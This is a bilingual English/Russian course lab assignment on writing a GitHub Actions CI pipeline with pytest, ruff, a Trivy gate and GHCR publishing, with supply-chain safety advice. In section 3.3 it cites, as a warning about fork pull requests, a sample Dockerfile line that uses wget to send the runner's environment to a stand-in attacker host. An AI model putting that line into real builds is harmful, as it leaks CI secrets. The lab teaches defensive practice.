# Lab 3 — Continuous Integration with GitHub Actions

Лаба 3 — Непрерывная интеграция с GitHub Actions

![difficulty](https://img.shields.io/badge/difficulty-beginner-success)
![topic](https://img.shields.io/badge/topic-CI/CD-blue)
![points](https://img.shields.io/badge/points-10%2B2-orange)
![tech](https://img.shields.io/badge/tech-GitHub%20Actions-informational)

> **Goal:** Put a pipeline behind the Lab 1/2 service. Every push: test → lint → scan → build → publish, on a clean runner, automatically.
> **Deliverable:** A PR from `lab03` adding `.github/workflows/python-ci.yml`, `app_python/tests/`, `requirements-dev.txt`, branch protection, and `app_python/docs/LAB03.md`.
>
> **Цель:** поставить пайплайн за сервисом из лаб 1/2. На каждый push: тесты → линт → скан → сборка → публикация — автоматически, на чистом runner.
> **Что сдать:** PR из ветки `lab03`, который добавляет `.github/workflows/python-ci.yml`, `app_python/tests/`, `requirements-dev.txt`, защиту ветки и `app_python/docs/LAB03.md`.

---

## Overview

Обзор

A green check on your laptop proves nothing. CI runs the *same* steps on the *same* runner for *every* commit, so "works on my machine" stops being a defence. The skill this lab assesses is **writing the GitHub Actions workflow by hand** — not filling in the last word of someone else's YAML.

Зелёная галочка на твоём ноутбуке ничего не доказывает. CI запускает *те же самые* шаги на *том же самом* runner для *каждого* коммита, поэтому «у меня локально работает» перестаёт быть оправданием. Навык, который проверяет эта лаба, — **умение писать workflow GitHub Actions руками**, а не вписывание последнего слова в чужой YAML.

In this lab you practice:

В этой лабе ты будешь:

- Writing pytest tests against the Lab 1 endpoints (real assertions, not import smoke tests)
  * Пишешь тесты на pytest для эндпоинтов из лабы 1 (настоящие проверки, а не smoke-тесты вида «импорт не упал»)
- Composing a GitHub Actions workflow file *from the keys up* — `name`, `on`, `permissions`, `concurrency`, `jobs`, `steps`
  * Собираешь файл workflow GitHub Actions *с нуля, от ключей* — `name`, `on`, `permissions`, `concurrency`, `jobs`, `steps`
- Publishing Docker images to GHCR using `GITHUB_TOKEN` (no PAT, nothing to rotate)
  * Публикуешь Docker-образы в GHCR с помощью `GITHUB_TOKEN` (без PAT — нечего ротировать)
- Gating merges on a Trivy filesystem scan
  * Блокируешь слияния по результатам сканирования файловой системы в Trivy
- Speeding CI up with `setup-python`'s pip cache and BuildKit's GHA layer cache
  * Ускоряешь CI за счёт pip-кэша в `setup-python` и кэша слоёв GHA в BuildKit

> ⚠️ **Scope:** No deploy step. CI publishes the image — the cluster pulls it in Lab 9+. Don't build a deploy-on-merge here; you'd be re-doing it with ArgoCD in Lab 13 anyway.
>
> ⚠️ **Границы лабы:** шага деплоя нет. CI публикует образ, а кластер забирает его начиная с лабы 9. Не делай здесь деплой по слиянию — в лабе 13 всё равно будешь переделывать это через ArgoCD.

---

## Project State

Состояние проекта

**You should have from previous labs:**

**Что должно остаться от предыдущих лаб:**

- `app_python/` from Lab 1 — Flask/FastAPI service with `/` and `/health`
  * `app_python/` из лабы 1 — сервис на Flask/FastAPI с эндпоинтами `/` и `/health`
- `app_python/Dockerfile` from Lab 2 — multi-stage, non-root, builds clean locally
  * `app_python/Dockerfile` из лабы 2 — многоступенчатый, запуск не от root, локально собирается без ошибок
- `app_python/requirements.txt` — pinned dependencies
  * `app_python/requirements.txt` — зависимости, зафиксированные по версиям

**This lab adds:**

**Что добавляет эта лаба:**

- `app_python/requirements-dev.txt` — pytest, pytest-cov, ruff
  * `app_python/requirements-dev.txt` — pytest, pytest-cov, ruff
- `app_python/tests/test_app.py` — real assertions on `/`, `/health`, an error path
  * `app_python/tests/test_app.py` — настоящие проверки для `/`, `/health` и пути с ошибкой
- `.github/workflows/python-ci.yml` — the pipeline (test → scan → build → push)
  * `.github/workflows/python-ci.yml` — пайплайн (тест → скан → сборка → публикация)
- Branch protection on `main` requiring those checks
  * Защита ветки `main`, требующая прохождения этих проверок
- `app_python/docs/LAB03.md` — your submission report
  * `app_python/docs/LAB03.md` — твой отчёт по сдаче

By Lab 13 this pipeline's GHCR image is what ArgoCD watches. The tagging strategy you pick this week is the one your future deploys will rely on.

К лабе 13 ArgoCD будет следить именно за GHCR-образом из этого пайплайна. Стратегия тегирования, которую ты выберешь на этой неделе, станет основой твоих будущих деплоев.

---

## Setup

Настройка

```bash
python --version            # 3.12+; the matrix tests 3.12 and 3.13
docker version              # 29.x; same as Lab 2
trivy --version             # v0.69.3 or later — NEVER v0.69.4 (see below)

# Local test of the workflow without pushing to GitHub:
brew install act           # macOS
# Linux: see https://github.com/nektos/act#installation
act --version              # 0.2.88+
```

Пояснение: проверь версии Python (3.12+), Docker (29.x) и Trivy — никогда не используй `v0.69.4` (см. ниже). Для локального прогона workflow без пуша в GitHub можно установить `act`: на macOS через `brew install act`, инструкция для Linux — по ссылке.

You'll commit only these new paths:

В коммит попадут только эти новые пути:

```
.github/
└── workflows/
    └── python-ci.yml                  # the workflow you write
app_python/
├── requirements-dev.txt
├── tests/
│   └── test_app.py
└── docs/
    └── LAB03.md
```

Пояснение: это структура файлов, которые нужно добавить в репозиторий.

---

## ⚠️ A Note on Supply-Chain Safety (read before Task 2)

⚠️ Замечание о безопасности цепочки поставок (прочитай перед задачей 2)

CI runs third-party code with access to your repository's secrets — the actions you pin **are** your attack surface. Two recent incidents define the rules:

CI запускает сторонний код с доступом к секретам твоего репозитория — закреплённые тобой actions **и есть** твоя поверхность атаки. Правила задают два недавних инцидента:

- **`tj-actions/changed-files` (CVE-2025-30066, March 14–15 2025)** — a compromised release leaked secrets from CI logs in **23,000+ repositories**. Every repo pinned to `@main` or a floating tag pulled the malicious code automatically. Fixed in `v46.0.1`.
  * **`tj-actions/changed-files` (CVE-2025-30066, 14–15 марта 2025)** — скомпрометированный релиз слил секреты из логов CI в **более чем 23 000 репозиториев**. Каждый репозиторий, закреплённый на `@main` или плавающем теге, автоматически подтянул вредоносный код. Исправлено в `v46.0.1`.
- **Trivy (CVE-2026-33634, March 19 2026)** — a malicious **`v0.69.4`** binary was published to the official GitHub release page after a maintainer signing key was compromised. **Use `v0.69.3` or a later patched release — NEVER `v0.69.4`.** The Action wrapper (`aquasecurity/trivy-action@v0.35.0`+) and `setup-trivy@v0.2.6`+ are post-incident-safe.
  * **Trivy (CVE-2026-33634, 19 марта 2026)** — вредоносный бинарник **`v0.69.4`** был опубликован на официальной странице релизов GitHub после компрометации ключа подписи мейнтейнера. **Используй `v0.69.3` или более поздний исправленный релиз — НИКОГДА `v0.69.4`.** Обёртка Action (`aquasecurity/trivy-action@v0.35.0`+) и `setup-trivy@v0.2.6`+ безопасны после инцидента.

**What you do about it in this lab:**

**Что делать в этой лабе:**

- Pin the runner OS: `runs-on: ubuntu-24.04`, not `ubuntu-latest`.
  * Закрепи ОС runner: `runs-on: ubuntu-24.04`, а не `ubuntu-latest`.
- Pin actions to a major tag: `actions/checkout@v4`. For high-risk or third-party actions, pin to a **full commit SHA** — a tag can be re-pointed by an attacker; a SHA cannot.
  * Закрепляй actions на мажорном теге: `actions/checkout@v4`. Для рискованных или сторонних actions указывай **полный SHA коммита** — тег атакующий может переставить, SHA — нет.
- Scope `permissions:` to the minimum each job needs (`contents: read` by default; `packages: write` only on the job that pushes to GHCR).
  * Ограничь `permissions:` минимумом, который нужен каждой джобе (`contents: read` по умолчанию; `packages: write` — только в джобе, которая пушит в GHCR).
- Never push images from PRs **from forks** — a fork can rewrite the Dockerfile and use your `GITHUB_TOKEN` to publish a malicious image to your namespace.
  * Никогда не пушь образы из PR **из форков** — форк может переписать Dockerfile и с помощью твоего `GITHUB_TOKEN` опубликовать вредоносный образ в твой namespace.

> 📌 Example SHA-pin (the comment keeps it readable):
>
> 📌 Пример закрепления на SHA (комментарий сохраняет читаемость):
> ```yaml
> - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
> ```

---

## Task 1 — Unit Tests with pytest (2 pts)

Задача 1 — юнит-тесты на pytest (2 балла)

### 1.1 — Pick a runner and justify it

1.1 — Выбери runner и обоснуй выбор

Use **pytest 8.3+**. Fixtures + plain `assert` beat `unittest`'s boilerplate for most projects, and `pytest-cov` is one line to wire in for the bonus. In `docs/LAB03.md` give one paragraph on why pytest over `unittest`.

Используй **pytest 8.3+**. Фикстуры и обычный `assert` в большинстве проектов выигрывают у шаблонного кода `unittest`, а `pytest-cov` подключается одной строкой — пригодится для бонуса. В `docs/LAB03.md` напиши один абзац о том, почему pytest, а не `unittest`.

### 1.2 — Write `requirements-dev.txt`

1.2 — Напиши `requirements-dev.txt`

`YOUR TASK`: create `app_python/requirements-dev.txt` with **exactly-pinned** versions of the dev tools — `pytest`, `pytest-cov`, and a linter (`ruff` recommended; `flake8` or `pylint` accepted). Use `pkg==X.Y.Z` form, not floating ranges; the lock-it-down argument from Lab 2 applies.

`ТВОЯ ЗАДАЧА`: создай `app_python/requirements-dev.txt` с **жёстко зафиксированными** версиями dev-инструментов — `pytest`, `pytest-cov` и линтера (рекомендуется `ruff`; допускаются `flake8` или `pylint`). Используй формат `pkg==X.Y.Z`, а не плавающие диапазоны; аргумент про фиксацию версий из лабы 2 действует и здесь.

### 1.3 — Write tests that actually fail when the app is broken

1.3 — Напиши тесты, которые действительно падают, когда приложение сломано

`YOUR TASK`: create `app_python/tests/test_app.py` with at least three tests. Each must assert on **behaviour**, not just that an import succeeded:

`ТВОЯ ЗАДАЧА`: создай `app_python/tests/test_app.py` минимум с тремя тестами. Каждый должен проверять **поведение**, а не просто то, что импорт сработал:

| Test | Asserts |
|------|---------|
| `GET /` | status `200`, response is JSON, body contains the **five** keys from Lab 1 (`service`, `system`, `runtime`, `request`, `endpoints`) |
| `GET /health` | status `200`, JSON body has `status == "healthy"` |
| Unknown route | status `404`, body is JSON (not the framework's HTML default — proves your Lab 1 error handler is wired) |

| Тест | Что проверяет |
|------|---------------|
| `GET /` | статус `200`, ответ в JSON, тело содержит **пять** ключей из лабы 1 (`service`, `system`, `runtime`, `request`, `endpoints`) |
| `GET /health` | статус `200`, в JSON-теле `status == "healthy"` |
| Неизвестный маршрут | статус `404`, тело в JSON (а не HTML по умолчанию от фреймворка — это доказывает, что обработчик ошибок из лабы 1 подключён) |

Hints (no full code given — writing the tests *is* the skill):

Подсказки (полного кода нет — написать тесты *и есть* навык):

- Flask: `app.test_client()` in a `pytest.fixture`; `r.get_json()` on the response.
  * Flask: `app.test_client()` в `pytest.fixture`; `r.get_json()` для ответа.
- FastAPI: `from fastapi.testclient import TestClient`; `r.json()` on the response.
  * FastAPI: `from fastapi.testclient import TestClient`; `r.json()` для ответа.
- **Don't** test internal helpers; test routes. A test that calls `get_uptime()` directly won't catch a routing typo.
  * **Не** тестируй внутренние хелперы — тестируй маршруты. Тест, который напрямую вызывает `get_uptime()`, не поймает опечатку в маршрутизации.
- **Don't** assert exact uptime values — flaky. Assert the *shape* (e.g. `"uptime_seconds" in body["runtime"] and isinstance(..., int)`).
  * **Не** проверяй точные значения uptime — такие тесты нестабильны. Проверяй *структуру* (например, `"uptime_seconds" in body["runtime"] and isinstance(..., int)`).

### 1.4 — Run them locally

1.4 — Запусти их локально

```bash
cd app_python
python -m venv venv && source venv/bin/activate
pip install -r requirements.txt -r requirements-dev.txt
pytest -q
ruff check .
```

Both must exit `0`. If they don't, fix the app, not the tests.

Обе команды должны завершиться с кодом `0`. Если нет — чини приложение, а не тесты.

### 1.5 — Proof of work

1.5 — Подтверждение работы

**Paste into `docs/LAB03.md`:**

**Вставь в `docs/LAB03.md`:**

- The output of `pytest -q` (real run from your machine — at least 3 dots, all passed)
  * Вывод `pytest -q` (реальный запуск на твоей машине — минимум три точки, все тесты прошли)
- The output of `ruff check .` (or `flake8 .`) — "All checks passed!" or equivalent
  * Вывод `ruff check .` (или `flake8 .`) — «All checks passed!» или аналог
- One sentence per test explaining what behaviour it locks in (this prevents "delete the test when it breaks" syndrome later)
  * По одному предложению на каждый тест: какое поведение он фиксирует (это защищает от привычки «удалить тест, когда он упал» позже)

---

## Task 2 — Test & Lint in CI (3 pts)

Задача 2 — тесты и линт в CI (3 балла)

Now wire the tests into GitHub Actions. The workflow file lives at `.github/workflows/python-ci.yml`. Tasks 2–4 all extend the **same file** — Task 2 delivers the `test` job, Task 3 adds `docker`, Task 4 wires the Trivy gate.

Теперь подключи тесты к GitHub Actions. Файл workflow находится в `.github/workflows/python-ci.yml`. Задачи 2–4 расширяют **один и тот же файл**: задача 2 добавляет джобу `test`, задача 3 — `docker`, задача 4 — гейт Trivy.

### 2.1 — Understand the keys before you write

2.1 — Разберись с ключами до того, как писать

A workflow has five top-level keys you will write:

В workflow есть пять ключей верхнего уровня, которые ты будешь писать:

| Key | What it controls | Lab 3 value |
|-----|------------------|-------------|
| `name:` | Display name in the Actions tab | freeform |
| `on:` | Triggers | `push` to `main` **and** `pull_request` |
| `permissions:` | What `GITHUB_TOKEN` can do | start `contents: read`; grant `packages: write` per-job |
| `concurrency:` | De-dup superseded runs | group by ref, `cancel-in-progress: true` |
| `jobs:` | The work | `test` (this task), `docker` (Task 3) |

| Ключ | Что он контролирует | Значение в лабе 3 |
|-----|------------------|-------------|
| `name:` | Отображаемое имя во вкладке Actions | свободный текст |
| `on:` | Триггеры | `push` в `main` **и** `pull_request` |
| `permissions:` | Что может делать `GITHUB_TOKEN` | начни с `contents: read`; выдай `packages: write` на уровне джобы |
| `concurrency:` | Дедупликация вытесненных запусков | группировка по ref, `cancel-in-progress: true` |
| `jobs:` | Сама работа | `test` (эта задача), `docker` (задача 3) |

### 2.2 — Write the workflow skeleton

2.2 — Напиши скелет workflow

`YOUR TASK`: create `.github/workflows/python-ci.yml` and fill in every blank. The skeleton shows the YAML **shape** — you supply the **values + step bodies**. Don't paste a workflow you found online; the grader will ask why you picked each value.

`ТВОЯ ЗАДАЧА`: создай `.github/workflows/python-ci.yml` и заполни все пропуски. Скелет показывает **форму** YAML — ты даёшь **значения и тела шагов**. Не вставляй workflow, найденный в интернете: преподаватель спросит, почему выбрано каждое значение.

```yaml
name: ___                              # YOUR TASK: workflow display name

on:
  ___:                                 # YOUR TASK: which event? push to main? branches filter?
    branches: [___]
    paths:                             # YOUR TASK: skip CI on docs-only commits
      - ___
      - ___
  ___:                                 # YOUR TASK: the other event (pull_request)
    paths:
      - ___
      - ___

permissions:
  contents: ___                        # YOUR TASK: minimum needed for checkout

concurrency:
  group: ___                           # YOUR TASK: how do you de-dup superseded runs on the SAME ref?
  cancel-in-progress: ___              # YOUR TASK: should an older run keep going? why/why not?

jobs:
  test:
    runs-on: ___                       # YOUR TASK: which runner? why pinned (not :latest)?
    strategy:
      fail-fast: ___                   # YOUR TASK: should 3.12 dying kill 3.13? what does that hide?
      matrix:
        python-version: [___, ___]     # YOUR TASK: which versions? (Lab 1 standardised on which?)

    steps:
      - uses: actions/checkout@___     # YOUR TASK: pin to major tag (or SHA — see supply-chain note)

      - uses: actions/setup-python@___
        with:
          python-version: ___          # YOUR TASK: reference the matrix value
          cache: ___                   # YOUR TASK: which cache mode does setup-python provide?
          cache-dependency-path: ___   # YOUR TASK: which file(s) does the cache key hash?
                                       #            (you install BOTH requirements.txt + requirements-dev.txt —
                                       #             cache must invalidate on either; YAML accepts a multi-line list)

      - name: ___                      # YOUR TASK: human-readable step name
        working-directory: ___         # YOUR TASK: which dir holds requirements*.txt + tests/?
        run: |
          # YOUR TASK: install both runtime and dev requirements
          # Hint: pip install -r requirements.txt -r requirements-dev.txt

      - name: ___                      # YOUR TASK: lint step name
        working-directory: ___         # YOUR TASK: same dir as install — ruff scans the code, not the repo root
        run: ___                       # YOUR TASK: ruff/flake8/pylint command

      - name: ___                      # YOUR TASK: test step name
        working-directory: ___         # YOUR TASK: same dir — without this, pytest finds 0 tests
        run: ___                       # YOUR TASK: pytest command (quiet mode? cov?)
```

Пояснение: это скелет workflow. Пропуски `___` и комментарии `# YOUR TASK` нужно заполнить самостоятельно; тела шагов `run:` пишешь ты, а не копируешь.

> 💡 **Why `working-directory:` on every step?** A fresh runner starts at the repo root (`$GITHUB_WORKSPACE`). Without `working-directory:`, `pytest -q` runs at the repo root and reports **`collected 0 items`** — a green-but-meaningless run. Set the dir on each step that touches the app (or set it once at the job level via `defaults.run.working-directory`).
>
> 💡 **Зачем `working-directory:` на каждом шаге?** Свежий runner стартует из корня репозитория (`$GITHUB_WORKSPACE`). Без `working-directory:` команда `pytest -q` выполняется в корне и выдаёт **`collected 0 items`** — зелёный, но бессмысленный прогон. Задавай каталог на каждом шаге, который работает с приложением (или один раз на уровне джобы через `defaults.run.working-directory`).

### 2.3 — Add a status badge

2.3 — Добавь статус-бейдж

`YOUR TASK`: once the workflow runs once on your fork, GitHub generates a badge URL of the form `https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg`. Add it to `app_python/README.md` at the top as a markdown image with a link back to the Actions tab — e.g.

`ТВОЯ ЗАДАЧА`: после первого запуска workflow в твоём форке GitHub сгенерирует URL бейджа вида `https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg`. Добавь его в начало `app_python/README.md` как markdown-картинку со ссылкой обратно на вкладку Actions — например:

```md
[![Python CI](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg)](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml)
```

### 2.4 — Validate locally with `act` before pushing

2.4 — Проверь локально через `act` перед пушем

Saves you minutes of CI debugging:

Это экономит минуты отладки в CI:

```bash
act -l                                                                       # list jobs
act push -j test --matrix python-version:3.13 -P ubuntu-24.04=catthehacker/ubuntu:act-24.04
```

Пояснение: `act -l` перечисляет джобы; второй командой ты запускаешь джобу `test` для Python 3.13, подставляя образ runner'а.

If `act` fails, your workflow is broken — fix it before pushing.

Если `act` падает, значит workflow сломан — исправь до пуша.

### 2.5 — Proof of work

2.5 — Подтверждение работы

**Paste into `docs/LAB03.md`:**

**Вставь в `docs/LAB03.md`:**

- Link to a green workflow run on your fork (or `act` output if you can't get CI on the fork yet)
  * Ссылка на зелёный прогон workflow в твоём форке (или вывод `act`, если CI в форке пока не запускается)
- The full workflow file (or a permalink to it in your repo)
  * Полный файл workflow (или постоянная ссылка на него в твоём репозитории)
- One paragraph: why your trigger filter (`paths:`) is what it is — what changes *should* fire CI, and what shouldn't?
  * Один абзац: почему фильтр триггера (`paths:`) именно такой — какие изменения *должны* запускать CI, а какие нет?
- One number: warm-cache install time vs cold-cache install time (look at the "Set up Python" step duration on a second run vs the first)
  * Одно число: время установки с тёплым кэшем против холодного (сравни длительность шага «Set up Python» во втором и первом запусках)

---

## Task 3 — Build & Publish to GHCR (3 pts)

Задача 3 — сборка и публикация в GHCR (3 балла)

Lab 2 pushed images by hand. CI does it for you: a `docker` job that builds the Lab 2 image and pushes it to GitHub Container Registry, authenticated with the auto-provisioned `GITHUB_TOKEN`. **No PAT. Nothing to rotate.**

В лабе 2 ты пушил образы руками. CI сделает это за тебя: джоба `docker` собирает образ из лабы 2 и пушит его в GitHub Container Registry, авторизуясь автоматически выданным `GITHUB_TOKEN`. **Никакого PAT. Нечего ротировать.**

### 3.1 — Pick your tagging strategy

3.1 — Выбери стратегию тегирования

`YOUR TASK`: before writing YAML, decide:

`ТВОЯ ЗАДАЧА`: прежде чем писать YAML, реши:

- **SemVer** (`v1.4.2`, driven by `git tag`) — for libraries or services with external consumers who pin you.
  * **SemVer** (`v1.4.2`, на основе `git tag`) — для библиотек или сервисов, у которых есть внешние потребители, фиксирующие твою версию.
- **CalVer** (`2026.05.28`) — for services nobody else pins, where "breaking change" doesn't really apply.
  * **CalVer** (`2026.05.28`) — для сервисов, которые никто не пиннит, где «ломающее изменение» толком неприменимо.
- **SHA-only** (`git-a3f1b2c`) — every commit gets an immutable tag. Mandatory regardless of the above; this is what reproducible deploys reference.
  * **Только SHA** (`git-a3f1b2c`) — каждый коммит получает неизменяемый тег. Обязательно независимо от выбранного выше варианта: именно на это ссылаются воспроизводимые деплои.

Whatever you pick, **`:latest` is a convenience pointer, not a release.** Never deploy `:latest` to anything that matters.

Что бы ты ни выбрал, **`:latest` — это удобный указатель, а не релиз.** Никогда не деплой `:latest` туда, где это важно.

In `docs/LAB03.md`, justify your choice in 2–3 sentences.

В `docs/LAB03.md` обоснуй свой выбор в 2–3 предложениях.

### 3.2 — Write the docker job

3.2 — Напиши джобу docker

`YOUR TASK`: append the `docker` job to `python-ci.yml`. Same skeleton-with-blanks rules — you write the values and the step bodies.

`ТВОЯ ЗАДАЧА`: добавь джобу `docker` в `python-ci.yml`. Те же правила со скелетом и пропусками — значения и тела шагов пишешь ты.

```yaml
  docker:
    needs: ___                         # YOUR TASK: which job must pass first? Why?
    runs-on: ___                       # YOUR TASK: same runner as test? why same/different?
    if: ___                            # YOUR TASK: gate on event_name — DON'T push from PRs (esp. fork PRs)
    permissions:
      contents: ___                    # YOUR TASK
      packages: ___                    # YOUR TASK: what does GHCR push need?

    steps:
      - uses: actions/checkout@___

      - uses: docker/login-action@___  # YOUR TASK: pin
        with:
          registry: ___                # YOUR TASK: which registry host?
          username: ___                # YOUR TASK: which github context value?
          password: ___                # YOUR TASK: ephemeral token expression — NOT a PAT

      - uses: docker/metadata-action@___
        id: meta
        with:
          images: ___                  # YOUR TASK: ghcr.io/<owner>/<image-name>
                                       # Tip: `ghcr.io/${{ github.repository }}` gives `ghcr.io/<owner>/<repo>`,
                                       # which is fine. If you want the image name to match the `devops-info-service`
                                       # tag you pushed by hand in Lab 2 (so Lab 9's Deployment can pin one name),
                                       # use `ghcr.io/${{ github.repository_owner }}/devops-info-service` instead.
          tags: |
            # YOUR TASK: at least TWO tag patterns.
            # Pick from: type=sha,prefix=git-  |  type=semver,pattern={{version}}
            #            type=raw,value=latest,enable={{is_default_branch}}
            #            type=schedule,pattern={{date 'YYYY.MM.DD'}}
            ___
            ___

      - uses: docker/build-push-action@___
        with:
          context: ___                 # YOUR TASK: which dir holds the Dockerfile?
          push: ___                    # YOUR TASK: hardcode true, or use github.event_name? (see §3.3)
          tags: ___                    # YOUR TASK: feed in metadata-action output
          labels: ___                  # YOUR TASK: feed in metadata-action output (OCI labels)
          cache-from: ___              # YOUR TASK: which GHA cache mode?
          cache-to: ___                # YOUR TASK: which GHA cache mode + mode=max?
```

### 3.3 — Don't push from fork PRs

3.3 — Не пушь из PR из форков

`YOUR TASK`: the `if:` on the docker job (or the `push:` arg on `build-push-action`) must prevent pushing when the PR comes from a fork. A fork PR can swap your Dockerfile for `FROM busybox; CMD wget evil.example.com/$(env)` and use your `GITHUB_TOKEN` to publish it under your namespace.

`ТВОЯ ЗАДАЧА`: условие `if:` в джобе docker (или аргумент `push:` у `build-push-action`) должно запрещать публикацию, когда PR пришёл из форка. PR из форка может подменить твой Dockerfile на `FROM busybox; CMD wget evil.example.com/$(env)` и с помощью твоего `GITHUB_TOKEN` опубликовать его в твоём namespace.

Hint: `github.event_name != 'pull_request'` covers the common case; for stricter setups, gate on `github.event.pull_request.head.repo.fork == false`.

Подсказка: `github.event_name != 'pull_request'` закрывает типичный случай; для более строгой настройки используй условие `github.event.pull_request.head.repo.fork == false`.

### 3.4 — Proof of work

3.4 — Подтверждение работы

**Paste into `docs/LAB03.md`:**

**Вставь в `docs/LAB03.md`:**

- Link to the green `docker` job run (Actions tab)
  * Ссылка на зелёный запуск джобы `docker` (вкладка Actions)
- Screenshot or URL of the package under **your repo → Packages** (`ghcr.io/<owner>/<repo>:<your-tag>`)
  * Скриншот или URL пакета в разделе **твой репозиторий → Packages** (`ghcr.io/<owner>/<repo>:<your-tag>`)
- The list of tags your run produced (copy from the metadata-action step's logs)
  * Список тегов, созданных твоим запуском (скопируй из логов шага metadata-action)
- 2–3 sentences justifying SemVer vs CalVer for this service
  * 2–3 предложения с обоснованием SemVer или CalVer для этого сервиса

---

## Task 4 — Trivy Vulnerability Gate (2 pts)

Задача 4 — гейт уязвимостей Trivy (2 балла)

A scan that only warns gets ignored. Make Trivy a **gate**: a HIGH/CRITICAL finding fails the job and blocks the merge.

Сканирование, которое только предупреждает, игнорируют. Сделай Trivy **гейтом**: находка уровня HIGH/CRITICAL валит джобу и блокирует слияние.

### 4.1 — Wire Trivy into the test job

4.1 — Подключи Trivy к джобе test

`YOUR TASK`: add a Trivy step *inside* the `test` job (or a dedicated `scan` job that `docker` `needs:`). It must run **before** the docker job — a vulnerable dep cannot make it into a published image.

`ТВОЯ ЗАДАЧА`: добавь шаг Trivy *внутрь* джобы `test` (или отдельную джобу `scan`, которую джоба `docker` указывает в `needs:`). Он должен выполняться **до** джобы docker — уязвимая зависимость не должна попасть в опубликованный образ.

> 💡 **Matrix vs scan:** if you add Trivy inside the matrixed `test` job, it runs twice (once per Python version) — wasteful but harmless. To run it once, either gate it with `if: matrix.python-version == '3.13'` or factor it into a separate `scan` job that the `docker` job `needs:`.
>
> 🌐 **DB mirror on restricted networks:** if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, set `TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2` in the step's `env:` — Aqua publishes an anonymous mirror there (see Lab 2's note).
>
> 💡 **Матрица и скан:** если добавить Trivy внутрь матричной джобы `test`, он выполнится дважды (по разу на каждую версию Python) — расточительно, но безвредно. Чтобы запустить его один раз, либо поставь условие `if: matrix.python-version == '3.13'`, либо вынеси в отдельную джобу `scan`, которую джоба `docker` указывает в `needs:`.
>
> 🌐 **Зеркало БД в закрытых сетях:** если runner не может достучаться до `ghcr.io/aquasecurity/trivy-db`, задай `TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2` в `env:` шага — Aqua публикует там анонимное зеркало (см. примечание в лабе 2).

```yaml
      - name: ___                                  # YOUR TASK: descriptive step name
        uses: aquasecurity/trivy-action@___        # YOUR TASK: version (>= 0.35.0; NEVER Trivy v0.69.4)
        with:
          scan-type: ___                           # YOUR TASK: fs or image? what do we have at this stage?
          scan-ref: ___                            # YOUR TASK: which path holds requirements.txt?
          severity: ___                            # YOUR TASK: which severities should block?
          exit-code: ___                           # YOUR TASK: what value turns this from warn into gate?
          ignore-unfixed: ___                      # YOUR TASK: skip CVEs with no patch? trade-off?
```

### 4.2 — Don't silence fixable CVEs

4.2 — Не замалчивай исправимые CVE

`YOUR TASK`: if Trivy flags a dependency, the **fix is in the PR**: bump the version in `requirements.txt`. Don't paper over it with `.trivyignore` or by raising the severity threshold. Track genuinely-unfixable findings in a GitHub issue with the CVE ID and a date.

`ТВОЯ ЗАДАЧА`: если Trivy ругается на зависимость, **исправление должно быть в PR**: подними версию в `requirements.txt`. Не маскируй проблему через `.trivyignore` и не повышай порог серьёзности. По-настоящему неисправимые находки заводи в issue GitHub с ID CVE и датой.

### 4.3 — Branch protection

4.3 — Защита ветки

`YOUR TASK`: in **Settings → Branches → Branch protection rules** for `main`:

`ТВОЯ ЗАДАЧА`: в **Settings → Branches → Branch protection rules** для ветки `main`:

- ✅ Require a pull request before merging (≥ 1 review)
  * ✅ Требовать pull request перед слиянием (≥ 1 ревью)
- ✅ Require status checks to pass — pick **`test`** (every matrix cell) and **`docker`**
  * ✅ Требовать прохождения статус-проверок — выбери **`test`** (все ячейки матрицы) и **`docker`**
- ✅ Require branches to be up to date before merging
  * ✅ Требовать актуальности ветки перед слиянием
- ✅ Do not allow bypassing the above (admins included)
  * ✅ Запретить обход этих правил (включая администраторов)

The green CI badge is decoration; required status checks are the gate.

Зелёный бейдж CI — украшение; настоящий гейт — обязательные статус-проверки.

### 4.4 — Proof of work

4.4 — Подтверждение работы

**Paste into `docs/LAB03.md`:**

**Вставь в `docs/LAB03.md`:**

- The Trivy step output from a green run (illustrative if you've fixed everything — your output will say `0` findings)
  * Вывод шага Trivy из зелёного прогона (иллюстративный, если ты всё починил — в твоём выводе будет `0` находок)
- If you bumped a dep, show the before/after `requirements.txt` diff
  * Если поднимал зависимость, покажи diff `requirements.txt` до и после
- Screenshot of your branch protection settings showing the required checks
  * Скриншот настроек защиты ветки с обязательными проверками
- One sentence on each: severity threshold choice; `ignore-unfixed` trade-off
  * По одному предложению на каждое: выбор порога серьёзности; компромисс из-за `ignore-unfixed`

---

## Bonus Task — Path-Filtered Multi-App CI + Coverage (2 pts)

Бонусная задача — CI для нескольких приложений с фильтрацией по путям + покрытие (2 балла)

Less hand-holding here. You already know how to write a workflow.

Здесь подсказок меньше. Ты уже умеешь писать workflow.

### Bonus.1 — Second workflow for the compiled-language app (1 pt)

Bonus.1 — Второй workflow для приложения на компилируемом языке (1 балл)

If you did Lab 1's bonus (Go/Rust/Java sibling), wire it up:

Если ты делал бонус из лабы 1 (соседнее приложение на Go/Rust/Java), подключи его:

- New file `.github/workflows/<lang>-ci.yml` with the same shape: lint + test + (optionally) build image.
  * Новый файл `.github/workflows/<lang>-ci.yml` такой же формы: линт + тесты + (опционально) сборка образа.
- **Both** workflows must `paths:`-filter to their own app dir so a commit touching only `app_python/` does not trigger the Go workflow, and vice versa.
  * **Оба** workflow должны фильтровать по `paths:` свой каталог приложения, чтобы коммит, затрагивающий только `app_python/`, не запускал Go-workflow, и наоборот.
- Demonstrate selective triggering: one commit in each app dir, show the Actions tab only fires the relevant workflow.
  * Продемонстрируй выборочный запуск: по одному коммиту в каталог каждого приложения, покажи, что во вкладке Actions срабатывает только нужный workflow.

### Bonus.2 — Coverage in CI (1 pt)

Bonus.2 — Покрытие в CI (1 балл)

- Run `pytest --cov=app_python --cov-report=xml --cov-report=term` in the `test` job.
  * Запусти `pytest --cov=app_python --cov-report=xml --cov-report=term` в джобе `test`.
- Upload to **Codecov** (`codecov/codecov-action@v4` — free for public repos) or **Coveralls**.
  * Загрузи в **Codecov** (`codecov/codecov-action@v4` — бесплатно для публичных репозиториев) или **Coveralls**.
- Add a coverage badge to `app_python/README.md`.
  * Добавь бейдж покрытия в `app_python/README.md`.
